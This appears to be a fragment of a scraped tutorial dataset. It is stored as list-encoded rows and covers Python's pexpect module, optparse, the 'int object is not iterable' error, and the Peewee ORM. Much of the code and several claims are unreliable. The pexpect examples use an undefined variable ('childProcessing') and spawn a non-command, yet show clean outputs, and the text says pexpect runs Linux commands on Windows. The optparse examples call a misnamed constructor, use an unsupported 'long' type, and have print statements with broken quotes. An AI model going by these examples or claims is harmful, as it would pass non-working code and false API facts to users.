on September 17. Other than its security features, the other, or we can say the most attractive thing about Linux, is that it is an open-source and free licensing software based on the FOSS (Free Open-Source Software) model. Unlike windows and many other desktop operating systems, Linux is absolutely free, and one can download its latest versions with hundreds of distributions. Other features that Linux offers to developers are faster interpreters and compilers, the option to do heavy customization, less OS complexity, and many others. But what if we don't have Linux OS and still want to use Linux commands. There could be many reasons for doing this, including we may want to get familiar with Linux commands, etc. Maybe not all programming languages, but Python offers us this option to run Linux commands on Windows or any other operating system. For this, Python has the pexpect module, which gives us the option to automate the Linux commands through a Python program using its functions. Therefore, we will learn all about this pexpect Module of Python and understand how we can run Linux commands through a Python program using it."", 'Pexpect is a Python package used to perform many functions, including automating Linux commands through Python programs, spawning child processes and after that automatically controlling them, etc. Pexpect module is a very rich module of Python that comes with lots of functions to perform many different tasks. Pexpect module works as a span child, and it responds to the expected pattern; we define using the Python program to perform several functions.', ""Pexpect is not an in-built package of Python (it doesn't install along with the Python installation), and that's why if this module is not present in our system already, we have to perform installation of this module. We should first make sure that the pexpect module is already installed in the system or not because we will not be able to perform implementation without having this module present in our system. If the Pexpect module is already not installed in our system, we can install this module through multiple methods, and among all the possible installation methods, installing the pexpect module with the pip installer is the simplest and easiest one. That's why we will use pip installer in this section for installing this module in our system, and in this method, we will use the following pip installer command:"", 'We have to write the above-given command in the command prompt terminal shell, and after writing the command, we have to press the enter key so that the pip installer will start installing this module in our system. Once the installation process of this module begins, it will take a while to install the module in our system successfully, and we have to wait till then.', ""As we can see, a successfully installed message is displayed on our screen, which means that the pexpect module is now successfully installed in our system. Now, we can move forward with the implementation part of the Pexpect module and start importing it into example programs to understand it's working."", 'We have a run() function in the pexpect module, which we can use to run and execute a command. We can use pexpect.run() method to execute a Linux command by providing it as an argument in the function, and then, we can return the result of the execution in the output. The run() function can be used as a replacement for the os.system method, which is used to execute Linux commands.', ""After importing the pexpect module as px in the program, we have used the run() method with an example Linux command to echo 'Welcome to JavaTpoint!' and we stored it in an initialized variable, i.e., executionResult. Lastly, we printed the execution result in the output using the print statement."", 'In this method, we will use a spawn class that will help us automate the Linux commands given in the program. Spawn class is the main interface by which we can start a new child process during the execution and control it through the child classes. The string argument we give in the spawn class can be replaced by the shell command (whenever needed), which must be executed in the program.', 'When using the spawn class method, we can use the expect() function with it, which is also an important method of spawn class. The expect() method waits for the child class (defined by us for the spawn class) to process so that it will return one of the given string inputs. When we run the program, the pattern we will specify in the spawn class function will be matched with the input strings defined in the child class, and the matching string will be returned in the output. The expect() used in the child class will return the position of the string where the input pattern of the spawn class is matched in the output.', ""As we can see, the index number of the input string, which is matched with the defined pattern, is printed in the output after executing the spawn class. That's how we can match input strings given in the expect() function at the child process with the pattern defined in the spawn class. Since index numbering starts from 0, that's why index number 2 is printed for the place of input string at 3rd position."", ""We have used the spawn class to start a child process after importing the pexpect module as px in the program. While starting the child process, we have defined a pattern as 'JavaTpoint', which we will match with the given input strings. After that, we have used the expect() function, where we have defined multiple input strings. The index number of the string, which will be matched with the defined pattern, will be stored as a result in the initialized variable. Lastly, we printed the result with an initialized variable by using it in a print statement."", 'In this method, we will use the sendline() function after starting the child process with the spawn class. The sendline() method will write over the string for the pattern defined for the child process. Sendline method is also used to return the number of bytes consumed by the pattern string defined by us, but we will only use this method for matching patterns from input strings in this part. This method is used to automate the Linux command when we write the string for the child process.', ""As we can see, the index number where the input string from the expect() function is matched with the defined pattern by the sendline method is printed in the output after execution. That's how we can define and match the pattern for the child process using the sendline method."", 'After starting the child process, we have used the sendline() function, where we have defined the pattern for the child process. Then, we matched the defined pattern with the input strings are given in the expect () function. Lastly, we printed the index number of the input string, which is matched with the defined pattern for the child process.']","['pip install pexpect', '>> pexpect.run(Linux command)', '# Importing pexpect module', 'import pexpect as px', '# Using run method with Linux command', ""executionResult = px.run('echo Welcome to JavaTpoint!')"", '# Showing result in the output', 'print(""The result after executing Linux commands through run method:"")', 'print(executionResult)', "">> pexpect.spawn('Linux Command')"", '>> childClassObject.expect(inputPatterns, searchwindowsize = -1, async_ = false)', '# Importing pexpect module', 'import pexpect as px', '# Starting a child process with spawn class', 'childProcess = px.spawn(""echo JavaTpoint"")', '# Matching the defined pattern with input strings of expect() function', 'processResult = childProcessing.expect([""Welcome"", ""To"", ""JavaTpoint"", ""Hello""])', '# Returning matched string index result in the output', 'print(""The defined pattern in the spawn class is matched at the index number:"", processResult, ""from the input strings given in expect function"")', '>> childProcess.sendline(""pattern"")', '# Importing pexpect module', 'import pexpect as px', '# Starting a child process with spawn class', 'childProcess = px.spawn(""JavaTpoint"")', '# Definite pattern for the child process', 'childProcess.sendline(""Welcome"")', '# Matching defined pattern with input strings', 'processResult = childProcessing.expect([""Welcome"", ""To"", ""JavaTpoint"", ""Hello""])', '# Returning matched string index result in the output', 'print(""The defined pattern for the child process by the sendline method is matched at the index number: "", processResult)']","['The result after executing Linux commands through run method:', 'Welcome to JavaTpoint!', 'The defined pattern in the spawn class is matched at the index number: 2 from the input strings given in expect function', 'The defined pattern for the child process by the sendline method is matched at the index number: 0']",[],"[""|||FTP passwords,|||ssh,|||Telnet,|||automating Linux commands, and many others||||||Using run() method|||Using spawn class method|||Using sendline() method|||&&&|||inputPatterns: These are input string patterns that would be matched with the pattern we have defined in the spawn class, and this is a mandatory argument to be given in the function.|||searchwindowsize: It is an optional window size and defines the size of the search window. The default value for this argument in the function is -1.|||async_: This is also an optional argument of the expect() function, and the input values taken by this argument are 'True' and 'False.' The default value for this argument in the function is False. We can set this value to 'True' when we are creating a non-blocking application.|||""]"
415,['Python Optparse Module'],"[""Command-line arguments and parsing input arguments is important aspect of programming and development. A command-line argument is nothing but an argument specified in the system's command line after the program's name. When we pass values in these command-line arguments, these values are directly passed into the program's arguments, and that's how the value of the argument or variable is stored in the program's memory. The command-line argument is given in the command prompt shell of the system after the program's name, for which we are passing these arguments.""]","['https://www.javatpoint.com/int-object-is-not-iterable', 'https://www.javatpoint.com/python-pexpect-module', 'https://www.javatpoint.com/int-object-is-not-iterable', 'https://www.javatpoint.com/python-pexpect-module', 'https://www.javatpoint.com/int-object-is-not-iterable']",[],[],"['Introduction to Optparse Module in Python', 'Working with the Optparse Module']","['Optparse Module of Python: Advantages', 'Optparse Module of Python: Installation', 'Creating an OptionParser Object', 'Defining Options', 'Way 1: Only Giving Option Argument:', 'Way 2: Giving String and Value Arguments:', '1) Defining Option only for Long Option String:', '2) Defining Option Instance for Short Option String:', 'Standard Actions for Option Instance:', 'Standard Option Attributes:', 'Optparse Module in Python: Implementation', 'Implementation 1: Using both long and short option values in an option instance:', 'Implementation 2: Passing Values in the Option Instances:', 'Implementation 3: Parsing Command-line Arguments to Print a Table:']","['Note: It should be noted that while giving input values for an option instance if we give a different data-type input value other than what is defined in the option instance, an error will occur, and an error message will be displayed in the output. To demonstrate this, we will run the Python code and give a different data-type value, other than the data-type of the option instance. Look at the following example program to understand this concept of option instances:']","['All these arguments are passed inside the main() function of the program, and it usually contains only two following arguments:', 'Following are some advantages of the optparse module of Python over other packages:', 'After this, we can use the functions of this module in the program and work with the command-line arguments using this module.', 'We can parse a command-line argument by optparse module through the following two phases:', 'In this method, we will give the option argument in the add_option() argument and use the following line of code to create option instances:', 'We can use the defined option instance in both long and short forms in both these methods.', 'We can use the following method with add_option() function to define an option only for long option string values:', 'We can use the following line of codes with add_option() function to define an option instance for the short option string values:', 'Following are the standard option attributes for the option instances we have defined using the add_option() function:', 'Look at the following example programs to understand the working of the optparse module:', 'Example 1: Look at the following Python program where we defined both long & short option instances:', 'Explanation:', 'Example 2: Look at the following program where we passed values for the option instances:', 'Explanation:', 'As we can see, an error message is displayed in the output when we give different data-type input values for the option instance.', 'Example 4: Look at the following Python program to understand the practical implementation of the optparse module:', ""That's how we can use this optparse module of Python to parse the command-line arguments and work with them through a Python program.""]","['These are some common advantages of using the optparse module of Python, and we can get an idea from these advantages that why this module is very popular and preferable over all other packages of Python for command-line arguments.', ""As we can see, we have imported the optparse module as opt, and after that, we have used the optionparser() function to create an instance for OptionParser and named it 'opInstance.'"", 'We have two methods to create an option instance in the program with the OptionParser. Following are the two ways which we can use in our program to create option instances with OptionParser:', 'In this method, we will give value arguments in the attribute option of the function and an optional string in the add_option() while defining the options instance. We can use the following line of code to define option instance by this method:', 'As we can see, we have to give the ""--foo"" value in the place of the optional argument in the add_option() function to define an option instance for a long option string.', 'As we can see, we have to give the ""-f"" argument in the place of the optional argument in the add_option() function to define an option instance for the short options string.', ""That's how we can define an option instance specifically for either long option string or short options string, and the output produced by these option instances are only in either long or short string form depending upon the method we have used."", 'We can use these attributes available for the option instance to set which data-type values will be taken by these options instances and what actions will be performed on these values in the program.', ""As we can see, the table of '7', which is also the input value in the command shell, is printed in the output after the command-line arguments are parsed in the program.""]","[""These two categories of arguments are used inside the main() function, and the second type of argument is taken from the command line argument. Parsing an argument means that how the command line argument passed by us is handled in the program. Also, all the command line arguments or arguments which we pass inside the command prompt shell are handled only by the main() function of the program. These command-line arguments are very helpful when we have to pass dynamic data and when multiple values are passed at a single time. When multiple arguments are passed in a single command-line call, the values will be assigned to the respective variable of the program according to the data type and functionality of the variables and functions. That makes it easy for us to pass multiple values simultaneously, and we don't even have to assign all values to their particular variables and functions."", ""All programming languages offer different types of functions for command-line arguments and parsing these arguments but talking specifically about Python offers us many in-built functions as well as multiple packages to perform these tasks. One such Python package is the Optparse module of Python, which we can use to set command line arguments and parse these arguments using a Python program. That's why we will learn about the Python optparse module in this tutorial, and we will pass command line arguments & parse them using functions of this module."", ""The optparse module of Python is a very good option to replace the getopt package, and it has become a modern alternate option to handle and parse command-line arguments in a Python program. This module is used to pass command-line arguments and parse them in a Python program using the functions of this module. Optparse module is a very good option over the getopt package because many features which were not available previously in the getopt package are now available in this module. Many functions such as automatic help generation, option callbacks, and type conversion were not previously available in the getopt package, but now these options are available to us in the optparse module. That's why the optparse module is becoming more popular and preferable over the getopt package to parse command-line arguments. Other than the functions not previously available in the getopt package, the optparse module has introduced many new features. In this tutorial, we will only discuss some basic functions and features of this module. In this tutorial, we will use some example programs to demonstrate some of the basic capabilities of the optparse module."", ""The optparse module is in-built of Python, and that's why we don't have to perform any installation process to work with this module. We can directly start working with the optparse module by importing this module into the example Python programs. To import this module in a Python program, we can use the following line of code:"", 'Here, in this part, we will discuss multiple functions and options available in the optparse module, which we can use to parse command-line arguments very easily. We will also use example programs in this part to understand the implementation of the optparse module in a better way. But first, we will learn to create an option parser object because this object will parse the command-line arguments passed for the main() function of the program.', 'Therefore, first, we have to create an OptionParser instance in the program, and we can do this using the optionparser() function of the optparse module. We can create an OptionParser instance, having the optionparser properties to parse command-line arguments, using the following line of codes in any Python program:', 'All the optparse options used in the program are implicitly added to the parser instance once the OptionParser instance is created. It also provides us the information about what we can do when the defined option is encountered on the command line. The OptionParser instance also provides us functions from which it is possible to pass a list of options to the OptionParser constructor in the program. But it should be noted that this form of using options from the OptionParser instance is not used as frequently.', 'While we are defining options in the OptionParser instance of the program, we should remember that the options should be added one at a time. Each option instance defined in the program represents a set of synonymous command-line option strings. We can define options in the program using the add_options() function, which will be implicitly added to the OptionParser instance. At the beginning of the argument, we can use any unnamed string arguments, which are treated as option instance names. We can create aliases for an option we are defining, i.e., to have both long and short forms of the same option we have defined, by simply passing multiple names for it.', 'If we want to define options for only short options string and long option string, then we have to use two separate methods (One for short options string and the second for long option string). Thus, the options defined through these two methods will only take either short options string value or long option string value depending on the function we used to define the option. Following are two functions that we can use to define either short options string or long option string:', 'The option instances we have defined in the program with the OptionParser constructor have some standard action options. These standard option actions are used to carry out several functions and store a specific type of input value in them. We can use these option actions to set which type of value we want to store in these option instances depending on the function of the program and the expected output. Following are the standard option actions that are available for the option instances:', 'These are the standard option actions available for all the option instances defined using the add_option function with the optionparser constructor. We can use one or multiple of them to set which value is stored or/and appended while parsing the command-line arguments.', 'The Option instances we defined also have several attributes that define the functionality and working of these options instances in the program. These attributes are used as a value to take some specific argument while parsing input commands or perform some particular function in the program.', 'In this part, we will understand the implementation of the optparse module of Python through some example programs where we will parse command-line arguments. We will understand the implementation of this module by performing multiple functions such as taking input value in the command line argument, using the classes and functions of this module. We will understand the working of these example programs through the output they yield and explanation of them.', ""In this implementation part, we will understand the working of optionparser and option instances by defining them in an example program. We will define options instances for both long option string and short option string and call them one by one while executing them from the system's command shell. Look at the following example program to understand this implementation part of the optparse module."", ""As we can see, we have called both the long option string and short option in an option instance using the long or short keyword argument in the function. We have also given a custom argument for the option instances, and the option instance is also called with the custom argument, and that's how it stores these values. That's how we can use the optparse module's function to create both long & short option string instances."", ""We have first imported the optparse and sys module in the program to use the functions of these modules. After that, we have used the argv function of the sys module in the print statement to print the option instance, which is called from the program. Then, we created the optionparser constructor using the OptionParser() function and named the constructor variable as 'opConst.' After that, we used this variable optionparser constructor to create option instances in the program using the add_opions() function. Then, we created three option instances in the program, and in these option instances, we have given the long or short option string arguments to define the type of the option instance. After that, we used the parse_args() function of the optparse module to parse the command-line arguments. Lastly, we used these args variables of the optparse module in the print statement to print several specific information from the option instances. After parsing the command-line arguments, we defined the information category before printing this information."", 'In this implementation part, we will pass values for the arguments we have defined inside the option instances. After the command-line arguments are parsed in the program, these values we have passed in the program will be printed in the output. We should remember that the data type of the values we are passing should be the same as the data type we are defining in the option instance; otherwise, it will produce an error in the output. Look at the following example program to understand this implementation part of the optparse module.', ""As we can see, after giving input values with different data types, these input values are assigned to the respective data type option instances. That's how we can give different data type input values and parse them to the defined option instances using the command-line shell."", 'After defining the optionparser constructor, we have defined multiple option instances in the program. These option instances are defined with the action argument set to ""store"" so that given input values will be stored for these option instances. Also, these option instances are set to take different data types so that when a particular data-type value is given in the input, it will be stored to that particular option instance only. Lastly, we printed the input values, which are parsed and stored to a particular option instance using the parsedOptions constructor in the print statement. We have also printed the data-type pf the value in the result with the value.', 'Till now, we have understood the working and implementation of both option instances and optionparser constructor. Now, we will use the optparse module and its functions to print a table in the command-line shell from the input value. We will use for loop in the program to loop over the input value and, thus, print the table in the command shell with the functions of the optparse module. This will help us better understand the working and practical implementation of parsing command-line arguments using the optparse module. Look at the following example program where we have printed the table in the command shell:']","['# Importing optparse module', 'import optparse', '# Importing the optparse module', 'import optparse as opt', '# Creating an OptionParser instance', 'opInstance = opt.optionparser()', '# Creating an option instance', 'oiVaribale = opInstance.add_option(option)', '# Creating an option instance', 'oiVaribale = opInstance.add_option(*opt_str, attr = userValue, ...)', '# Option instance for long option string', 'losInstance = opInstance.add_option(""--foo"", attr = userValue, ...)', '# An option instance for short option string value', 'sosVariable = opInstance.add_option(""-f"", attr = userValue, ...)', '# Importing the optparse module', 'import optparse as opt', '# Import the sys module', 'import sys', '# Printing the argv value', ""print('ARGV value for option instances    :', sys.argv[1:])"", '# Creating an optionparser constructor for option instances', 'opConst = opt.OptionParser()', '# Defining an option instance with both short & long instance', ""opConst.add_option('-s', '--long',"", 'dest = ""output_filename"",', 'default = ""default.out"",', ')', '# Creating another option instances with several arguments', ""opConst.add_option('-v', '--verbose',"", 'dest = ""verbose"",', 'default = False,', 'action = ""store_true"",', ')', ""opConst.add_option('--version',"", 'dest = ""version"",', 'default = 1.0,', 'type = ""float"",', ')', '# Creating parser arguments for options and remainder instances', 'oInstance, rInstance = opConst.parse_args()', '# Printing values in the output', ""print('VERSION of the input string   :', oInstance.version)"", ""print('VERBOSE for the input value   :', oInstance.verbose)"", ""print('OUTPUT with respect to input string    :', oInstance.output_filename)"", ""print('REMAINING for remainder is the function :', rInstance)"", '# Importing the optparse module', 'import optparse as opt', '# Creating an optionparser constructor for option instances', 'opConst = opt.OptionParser()', '# Defining multiple option instances with different data types', 'opConst.add_option(\'-a\', action = ""store"", type = ""int"")', 'opConst.add_option(\'-b\', action = ""store"", type = ""float"")', 'opConst.add_option(\'-c\', action = ""store"", type = ""long"")', 'opConst.add_option(\'-d\', action = ""store"", type = ""complex"")', 'opConst.add_option(\'-s\', action = ""store"", type = ""string"")', '# Parsing options instance to show input given values', 'parsedOptions, args = opConst.parse_args()', '# Printing input string values with the respective option instances', ""print(The int data type input value for the first option : %-16r %s' % (type(parsedOptions.a), parsedOptions.a))"", ""print(The float data type input value for the second option : %-16r %s' % (type(parsedOptions.b), parsedOptions.b))"", ""print(The long data type input value for the third option : %-16r %s' % (type(parsedOptions.c), parsedOptions.c))"", ""print(The complex data type input value for the fourth option : %-16r %s' % (type(parsedOptions.d), parsedOptions.d))"", ""print(The string data type input value for the last option : %-16r %s' % (type(parsedOptions.s), parsedOptions.s))"", '# Importing the optparse module', 'import optparse as opt', '# Creating an optionparser constructor for option instances', 'opConst = opt.OptionParser()', '# Defining multiple option instances with different data types', 'opConst.add_option(\'-a\', action = ""store"", type = ""int"")', '# Parsing options instance to show input given values', 'parsedOptions, args = opConst.parse_args()', '# Printing input string values with the respective option instances', ""print(The int data type input value for the first option : %-16r %s' % (type(parsedOptions.a), parsedOptions.a))"", '# Importing the optparse module', 'import optparse as opt', '# Define a function to print table of n', 'def tablePrint(num, destCheak):', '# Using for loop to print the table', 'for a in range(1,11):', 'table = a * num', '# Using if to check if destination input given is other than 0', 'if destCheak:', 'print(table)', 'return table', '# Define main function to add options for taking input value', 'def Main():', '# Create the OptionParser constructor', 'opConst = opt.OptionParser()', '# Adding multiple option instances with specific functions', ""opConst.add_option('-m', dest = 'num',"", ""type = 'int',"", ""help = 'specify the nth table number to print table in the output') # Using help argument to show help message in the case of error"", ""opConst.add_option('-c', dest = 'out',"", ""type = 'string',"", ""help = 'specify an output file for the input value (Optional)')"", 'opConst.add_option(""-b"", ""--all"",', 'action = ""store_true"",', 'dest = ""prin"",', 'default = False,', 'help = ""print all numbers up to N from the print table function"")', '# Adding parsed options constructor', '(optionParsed, args) = opConst.parse_args()', 'if (optionParsed.num == None):', 'print (opConst.usage)', 'exit(0)', 'number = optionParsed.num', '# Calling the print table function', 'result = tablePrint(number, optionParsed.prin)', '# Printing the last term of table in the result', 'print (""This is the table of given input value number with last term:"" + str(result))', '# Checking if given input value is not 0', 'if (optionParsed.out != None):', '# Opening a file in append mode to print table', 'func = open(optionParsed.out, ""a"")', '# Writing in the file we appended', ""func.write(str(result) + '\\n')"", '# Driver code to call main function', ""if __name__ == '__main__':"", '# Calling the main function', 'Main()']","['While calling with the short option string argument:', 'C:\\Users\\Manish\\Downloads>python code.py -s sample3.txt', ""ARGV value for option instances    : ['-s', 'sample3.txt']"", 'VERSION of the input string   : 1.0', 'VERBOSE for the input value   : False', 'OUTPUT with respect to input string    : sample3.txt', 'REMAINING for remainder is the function : []', 'While calling with the long option string argument:', 'python code.py --long sample4.txt', ""ARGV value for option instances    : ['--long', 'sample4.txt']"", 'VERSION of the input string   : 1.0', 'VERBOSE for the input value   : False', 'OUTPUT with respect to input string    : sample4.txt', 'REMAINING for remainder is the function : []', 'While calling with a custom argument for the option instance:', 'python code.py --lon sample4.txt', ""ARGV value for option instances    : ['--lon', 'sample4.txt']"", 'VERSION of the input string   : 1.0', 'VERBOSE for the input value   : False', 'OUTPUT with respect to input string    : sample4.txt', 'REMAINING for remainder is the function : []', 'code.py -a 5 -b 31.26 -c 24260000 -d 24+26j -s max', ""The int data type input value for the first option : <class 'int'>    5"", ""The float data type input value for the second option : <class 'float'>  31.26"", ""The long data type input value for the third option : <class 'int'>    24260000"", ""The complex data type input value for the fourth option : <class 'complex'> (24+26j)"", ""The string data type input value for the last option : <class 'str'>    max"", 'code.py -a c', 'Usage: code.py [options]', ""code.py: error: option -a: invalid integer value: 'c'"", 'python code.py -m 7 -b', '7', '14', '21', '28', '35', '42', '49', '56', '63', '70', 'This is the table of given input value number with last term:70']",[],"['|||The number of arguments should be passed in the program|||The list of command-line arguments passed in the program||||||optparse module makes it very easy for us to use command-line arguments and parse them through a Python program.|||This module has all the previously lacking features in the getopt package of Python.|||optparse module made it easy for us to handle dynamic input data, and it also provides the option to change the output according to dynamic input data.|||Besides this, it also provides us with some very new features which are helpful in smoothly handling all the command-line arguments.||||||First, we have to create an OptionParser instance in the program to handle the command-line arguments, and it should be configured and constructed with the expected options or values that can be given in command-line arguments.|||After that, a sequence of options or values is given from the command-line arguments and processed in the program.||||||""append"": This action is used to append the option\'s argument of this option instance to a list|||""store"": The ""store"" action is used to store the option\'s argument of the option instance, and it is default set in the add_option() function|||""store_false"": This option is used to store false argument in the option instance|||""store_true"": This option is used to store true argument in the option instance|||""append_const"": The ""append_const"" action is used in the option instance to append a constant value from the option instance to a list|||""store_const"": This option is used in the option instance to store a constant value in the instance||||||optionInstance.default: The value used with this attribute in the option instance is used for the destination of this option instance when this option instance is not seen on the command line|||optionInstance.dest: It is a default attribute for the option instance, and it is derived from the option strings provided as input arguments|||optionInstance.type: This attribute is used to set the data type of the value which is taken by this option instance, and by default, it is set to ""strings""|||optionInstance.action: This attribute is used in the option instance to set what action will be performed on the value given in the option instance, and by default, this attribute is set to ""store"" action|||']"
416,['int object is not iterable'],"['As we take python language under consideration, we can say that the error mainly arises while performing code, not with proper rules. One of the rules is to iterate the int object throughout while the program runs. If we do so, it will raise the error, named as int object is not iterable.']","['https://www.javatpoint.com/python-peewee-library', 'https://www.javatpoint.com/python-optparse-module', 'https://www.javatpoint.com/python-peewee-library', 'https://www.javatpoint.com/python-optparse-module', 'https://www.javatpoint.com/python-peewee-library']","['https://static.javatpoint.com/python/images/int-object-is-not-iterable1.png', 'https://static.javatpoint.com/python/images/int-object-is-not-iterable2.png', 'https://static.javatpoint.com/python/images/int-object-is-not-iterable3.png', 'https://static.javatpoint.com/python/images/int-object-is-not-iterable4.png', 'https://static.javatpoint.com/python/images/int-object-is-not-iterable5.png', 'https://static.javatpoint.com/python/images/int-object-is-not-iterable6.png']",[],[],['Examples of TypeError: int object is not iterable'],[],"[""Here the term 'iterable' means to go through each string or word till the end by iterating over it one by one."", 'For example,', 'Let us understand with the help of some examples:', 'Example 1: Here, in this problem, we are provided with the random number, and we will try to iterate it using a for a loop.', 'Explanation:', 'The output of the above program:', 'Correction of above program:', 'The output of the above program:', 'Explanation:', 'The output of the above program:', 'Correction of above program:', 'The output of the above program:', 'Example 3: Here, in this problem, we are provided with the random number, and we will try to iterate it using a for a loop.', 'Explanation:', 'The output of the above program:', 'Correction of above program:', 'The output of the above program:', 'Example 4: Here, in this problem, we are provided with a random number, and we want to separate all the digits of that number.', 'Explanation:', 'The output of the above program:', 'Correction of above program:', 'The output of the above program:']",['Example 2: Here in this problem we are provided with the random list of numbers or may be of some string values and we will try to iterate it using a for loop.'],"['From the above discussion, we are familiar with the error int object is not iterable arises whenever we iterate any integer value, which is impossible. This error has come under TypeError; the type error usually arises whenever we call any function or use an incorrect data type operator.', 'If we perform an addition operation between a string and an integer object, we will get some error; this error is mainly called a type error because the data type of both objects does not match. Thus, we can easily iterate the list objects using for loop, but we can not do the same thing with a number. We can not separate each digit of the number using for loop, we can do so if we will store that particular number in a list.', 'Here in this above example, we can easily find that we want to iterate a number, let say 10, by reading it one by one. But, we can do so because it is combined treated as a single-digit and unable to break as a one by one digit. To get the desired output, we can rectify the above program and use the range function in it.', 'In this correction part, we have replaced the j by passing it into a single function named as range; after passing the number in the range function then the python programming language will easily get to recognize the working of the built-in function range in python and its main role to return a sequence of number begins from 0 itself by default and then incremented one by one until it reaches to the end value, that is passed in the arguments of this function.', 'Here in this above example, if we observe, we can easily find that we want to iterate a number, let say 10, by reading it one by one. But we can do so because it is combined treated as a single-digit and unable to break as a one by one digit. To get the desired output, we can rectify the above program and use the range function in it.', 'In this correction part, we have replaced the j by passing it into a single function named as range; after passing the number in the range function then the python programming language will easily get to recognize the working of the built-in function range in python and its main role to return a sequence of number begins from 0 itself by default and then incremented one by one until it reaches to the end value, that is passed in the arguments of this function.', 'Here in this above example, if we observe, we can easily find that we want to iterate a number, let say 5, by reading its one by one, but we can do so because it is combined treated as a single-digit and unable to break as a one by one digit. To get the desired output, we can rectify the above program and use the range function in it.', 'In this correction part, we have replaced the num by passing it into a single function named as range; after passing the number in the range function then the python programming language will easily get to recognize the working of the built-in function range in python and its main role to return a sequence of number begins from 0 itself by default and then incremented one by one until it reaches to the end value, that is passed in the arguments of this function.', 'Here in this above example, if we observe, we can easily find that we want to iterate a number, let say 110892, by reading its one by one, but we can do so because it is combined and treated as a single-digit and unable to break as a one by one digit. But we store all the separated digits in a list to easily access each digit of the number, but in the above example, a type error arises where the int object is not iterable. Now for getting the desired output, we can rectify the above program.', 'In this correction part, we have replaced the num by passing it into a single function named as str; by using this function, we can easily break the particular number and, in combined form, store them in a list, the python programming language will easily get to recognize the working of the built-in function str in python.']","['# Python program to check the TypeError: int object is not iterable', 'j = int(input(""Enter a random number to check the type error: ""))', 'for i in j:', 'print(i)', '# Python program to check the TypeError: int object is not iterable', 'j = int(input(""Enter a random number to check the type error: ""))', 'for i in range(j):', 'print(i)', '# Python program to check the TypeError: int object is not iterable', 'costlist = [200, 219.2, 238, 316.7, 779, 56, 100]', 'taxlist = []', 'for index in len(costlist):', 'taxlist.append(costlist[index] + (costlist[index] *0.25))', 'print(taxlist)', '# Python program to check the TypeError: int object is not iterable', 'costlist = [200, 219.2, 238, 316.7, 779, 56, 100]', 'taxlist = []', 'for index in range(len(costlist)):', 'taxlist.append(costlist[index] + (costlist[index] *0.25))', 'print(taxlist)', '# Python program to check the TypeError: int object is not iterable', 'num = int(input(""Enter a random number to check the type error: ""))', 'for i in num:', 'print(i)', '# Python program to check the TypeError: int object is not iterable', 'num = int(input(""Enter a random number to check the type error: ""))', 'for i in range(num):', 'print(i)', '# Python program to check the TypeError: int object is not iterable', 'num = int(input(""Enter a random number to check the type error : ""))', 'Digit=[int(i) for i in num]', '# Python program to check the TypeError: int object is not iterable', 'num = int(input(""Enter a random number to check the type error : ""))', 'Digit=[int(i) for i in str(num)]', 'print(Digit)']","['Enter a random number to check the type error: 10', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'Enter a random number to check the type error: 10', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']",[],"['|||If we want to iterate an integer value, let say 6, we cannot iterate it.|||As we cannot break it further in its subsequences, it will raise a popup error that we cannot iterate an integer value.|||The question arises: whether we can iterate a more than the one-digit number? its answer is no. It is because the python compiler will treat that number as a single digit, and here we drive the same conclusion that an int object is not iterable; we cannot break it into parts.|||If we want to separate each of the digits from a number consisting of more than one digit, we will use different methods, but we can do it by using iteration.|||For doing so, we can store the digits in the form of a list of that particular number.|||']"
417,['Python Peewee Library'],"['Peewee is a Python library based on ORM (Object-Relational Mapping), which supports SQLite, MySQL, PostgreSQL, and Cockroach databases. In the following tutorial, we will be learning how to insert a new record, delete a record, create an index, and a lot more using the Peewee library in the Python programming language. Moreover, we will also understand connection management, text and binary fields, subqueries, filters, and more with respect to Peewee.']","['https://www.javatpoint.com/some-cryptocurrency-libraries-for-python', 'https://www.javatpoint.com/int-object-is-not-iterable', 'https://www.javatpoint.com/some-cryptocurrency-libraries-for-python', 'https://www.javatpoint.com/int-object-is-not-iterable', 'https://www.javatpoint.com/some-cryptocurrency-libraries-for-python']",[],[],"['Understanding the Peewee library in Python', 'Setting Up the Environment', 'Understanding the mapping using Peewee', 'Understanding the Field Types in Peewee', 'Defining the model using Peewee', 'Dropping table using Peewee', 'Peewee insert_many() method', 'Selecting all instances using Peewee', 'Filtering data using Peewee where method', 'Peewee multiple where expressions', 'Retrieving Single instance using Peewee', 'Selecting column using Peewee', 'Counting Instances using Peewee', 'Displaying SQL statements using Peewee', 'Peewee offset and limit attributes', 'Ordering using Peewee']",[],[],"[""So, let's get started."", 'We can install the latest version of Peewee as hosted on PyPI (short for Python Package Index), using the pip installer as shown below:', 'A Model maps to the database table, a Field to the table column, and an instance to the table row.', 'Field types in a Peewee model define the storage type of the model. They are translated to the corresponding database column types.', 'The above table lists the Peewee field types and the corresponding SQLite, PostgreSQL, and MySQL column types.', 'In the first example, we will be creating a simple database table.', 'Explanation:', 'We can drop the table using the drop_table() function. Let us consider the following example demonstrating the same.', 'Explanation:', 'The insert_many() method of the Peewee library is used to perform bulk creates operation.', 'Let us consider the following example demonstrating the same.', 'Explanation:', 'The select method of Peewee is used to retrieve instances of the defined models. Let us consider the following example illustrating the same:', 'Explanation:', 'Explanation:', 'Explanation:', 'There are two methods that we can use to select a single instance; each of them utilizes a get() function.', 'Let us consider the following example to understand the working of the same:', 'Explanation:', 'We can specify the names of the columns inside the select method that has to be included within the query.', 'Here is the example that demonstrates the same:', 'Explanation:', 'Explanation:', 'The Peewee library offers the sql method that allows programmers to generate SQL statements.', 'Let us consider the following example that illustrates the same:', 'Explanation:', 'Let us consider the following example demonstrating the same:', 'Explanation:', 'We can use the Peewee order_by function in order to retrieve instances. Let us consider the following example demonstrating the same:', 'Explanation:', 'Deleting instance using Peewee', 'Let us consider the following example demonstrating the same:', 'Explanation:', 'Deleting multiple instances using Peewee', 'Let us consider the following example illustrating the same:', 'Explanation:', 'Updating instance using Peewee', 'We can use the Peewee update method in order to update an instance. It returns the number of successfully updated instances.', 'Here is the example demonstrating the same:', 'Explanation:']","['There are no other dependencies for this library to work. It works with SQLite without installing any other package since the sqlite3 module is bundled with the standard library.', 'Peewee utilizes MySQLDatabase for MySQL, PostgresqlDatabase for PostgreSQL, and SqliteDatabase for SQLite. For the following tutorial, we will be working with the SQLite database.', 'The where method of Peewee allows programmers to filter data based on a specified condition. Let us consider the following example to understand the same:', 'We can use the where method multiple times and combine them to produce a new expression and precise the filtration process. Let us consider the following example demonstrating the same:', 'We can use the count method in order to calculate the number of model instances in the table. Let us consider the following example that illustrates the same:', 'Peewee also provides several attributes like offset and limit that allow programmers to define the initial skip of instances and the number of instances to be included in the select function.', 'The Peewee library provides the delete_by_id method that allows programmers to delete an instance identified by its ID. This function returns the number of deleted instances.', 'In order to delete more 